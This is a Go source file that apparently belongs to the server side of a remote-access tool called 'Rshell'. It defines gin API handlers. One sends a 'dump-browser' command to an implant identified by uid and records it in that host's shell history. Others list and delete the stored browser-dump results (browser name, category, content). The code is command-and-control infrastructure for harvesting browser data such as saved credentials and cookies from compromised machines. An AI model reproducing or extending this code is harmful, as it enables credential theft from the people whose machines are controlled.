package api

import (
	"Rshell/pkg/command"
	"Rshell/pkg/database"
	"Rshell/pkg/sendcommand"
	"encoding/binary"
	"net/http"
	"strconv"

	"github.com/gin-gonic/gin"
)

type DumpBrowserResultResp struct {
	Id          int64  `json:"id"`
	Uid         string `json:"uid"`
	BrowserName string `json:"browserName"`
	Category    string `json:"category"`
	Content     string `json:"content"`
	CreatedAt   int64  `json:"createdAt"`
}

func DumpBrowser(c *gin.Context) {
	var req struct {
		Uid string `json:"uid"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	var shellHistory database.Shell
	database.Engine.Where("uid = ?", req.Uid).Get(&shellHistory)
	shellHistory.ShellContent = shellHistory.ShellContent + "$ dump-browser\n"
	database.Engine.Where("uid = ?", req.Uid).Update(&shellHistory)

	cmdTypeBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.DumpBrowser))
	byteToSend := append(cmdTypeBytes, []byte(req.Uid)...)
	sendcommand.SendCommandBytes(req.Uid, byteToSend)

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}

func ListDumpBrowser(c *gin.Context) {
	uid := c.Param("uid")
	if uid == "" {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "uid is required"})
		return
	}

	var results []database.DumpBrowserResults
	database.Engine.Where("uid = ?", uid).Desc("id").Find(&results)

	var resp []DumpBrowserResultResp
	for _, r := range results {
		resp = append(resp, DumpBrowserResultResp{
			Id:          r.Id,
			Uid:         r.Uid,
			BrowserName: r.BrowserName,
			Category:    r.Category,
			Content:     r.Content,
			CreatedAt:   r.CreatedAt,
		})
	}

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": resp})
}

func DeleteDumpBrowser(c *gin.Context) {
	idStr := c.Param("id")
	id, err := strconv.ParseInt(idStr, 10, 64)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 400, "data": "invalid id"})
		return
	}

	_, err = database.Engine.ID(id).Delete(&database.DumpBrowserResults{})
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"status": 500, "data": "delete failed"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
}
